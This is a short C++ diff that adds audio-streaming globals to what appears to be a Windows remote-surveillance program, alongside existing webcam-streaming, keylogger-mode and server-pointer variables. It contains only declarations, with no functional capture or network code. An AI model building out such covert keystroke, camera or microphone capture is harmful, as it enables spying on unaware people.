@@ -8,6 +8,10 @@ std::set<DWORD> g_PendingModifiers;
 bool g_IsStreaming = false;
 std::thread* g_WebcamThread = nullptr;
 
+// Audio streaming
+bool g_IsStreamingAudio = false;
+std::thread* g_AudioThread = nullptr;
+
 // Keylogger Mode
 std::string g_KeylogMode = "buffer"; // Mặc định: buffer mode
 server* g_ServerPtr = nullptr;
